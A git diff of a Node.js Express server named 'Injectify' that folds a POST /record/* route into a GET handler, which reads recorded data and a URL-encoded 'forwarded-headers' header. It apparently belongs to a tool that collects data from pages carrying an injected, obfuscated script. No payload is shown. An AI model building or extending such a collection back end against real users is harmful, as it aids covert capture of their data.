@@ -28,7 +28,6 @@ const ObfuscateJS	= require('js-obfuscator')
 const reverse		= require('reverse-string')
 const escapeUTF8	= require('unicode-escape')
 const parseAgent	= require('user-agent-parser')
-const bodyParser	= require('body-parser')
 
 console.log(chalk.greenBright("[Injectify] ") + "listening on port " + config.express)
 
@@ -529,10 +528,17 @@ MongoClient.connect(config.mongodb, function(err, db) {
 		})
 	})
 
-	// Tell express to use the body-parser middleware and to not parse extended bodies
-	app.use(bodyParser.urlencoded({ extended: false }))
-
-	let recordAPI = (req, res, headers) => {
+	app.get('/record/*', (req, res) => {
+		let headers = req.headers
+		if (req.headers['forwarded-headers']) {
+			// Attempt to extract forwarded headers
+			try {
+				headers = JSON.parse(decodeURIComponent(req.headers['forwarded-headers']))
+			} catch(e) {
+				// Failed to parse JSON from forwarded headers => likely malicious
+				return
+			}
+		}
 		let validate = base64 => {
 			return new Promise((resolve, reject) => {
 				if (typeof base64 === "string") {
@@ -774,20 +780,6 @@ MongoClient.connect(config.mongodb, function(err, db) {
 		}).catch(error => {
 			if (config.debug) console.log(chalk.redBright("[record] ") + chalk.yellowBright(error));
 		})
-	}
-
-	app.get('/record/*', (req, res) => {
-		recordAPI(req, res, req.headers)
-	})
-
-	app.post('/record/*', (req, res) => {
-		let headers = req.headers
-		try {
-			headers = JSON.parse(req.body['forwarded-headers'])
-		} catch(e) {
-			// Failed to parse JSON from forwarded headers => could be malicious
-		}
-		recordAPI(req, res, headers)
 	})
 
 	app.get('/api/*', (req, res) => {
